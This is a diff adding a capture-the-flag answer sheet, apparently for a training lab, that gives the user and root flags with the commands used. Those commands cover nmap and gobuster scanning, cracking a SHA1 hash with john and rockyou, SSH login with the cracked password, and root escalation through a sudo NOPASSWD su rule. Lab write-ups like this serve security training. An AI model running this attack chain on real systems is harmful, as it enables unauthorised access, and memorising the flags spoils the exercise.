@@ -1,0 +1,24 @@
+
+							    Final Exam
+							   ==============
+
+1. what is user.txt
+ans: supernootnoot
+command: nmap -sC -sV 10.10.214.151 > nmap.txt
+command: gobuster dir -u 10.10.214.151 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+command: gobuster dir -u 10.10.214.151/secret/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+command: curl http://10.10.214.151/secret/secret.txt > secret.txt
+command: cat secret.txt
+command: john --format=raw-sha1 secret.txt -wordlist /usr/share/wordlist/rockyou.txt
+command: ssh nyan@10.10.214.151 (password = nyan)
+command: ls
+command: cat usr.txt
+
+2. what is root.txt
+ans: congratulations!!!!
+command: sudo -l ((root) NOPASSWD: /bin/su)
+command: sudo /bin/su
+command: id (uid=0(root) gid=0(root) groups=0(root))
+command: cd /root
+command: ls
+command: cat root.txt
